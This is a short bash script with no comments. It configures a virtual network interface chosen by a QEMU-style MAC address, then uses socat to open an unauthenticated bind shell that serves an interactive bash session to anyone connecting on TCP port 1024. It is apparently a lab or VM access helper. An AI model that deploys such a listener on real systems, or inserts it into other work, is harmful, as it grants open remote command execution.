#!/bin/bash
IFACE=$(ip -o link | grep -i 52:54:00:AA:BB:CC | cut -d':' -f2 | xargs)
ip addr add 192.168.100.1/24 dev "$IFACE"
ip link set "$IFACE" up
socat TCP-LISTEN:1024,reuseaddr,fork EXEC:"/bin/bash -li",pty,stderr,setsid,sane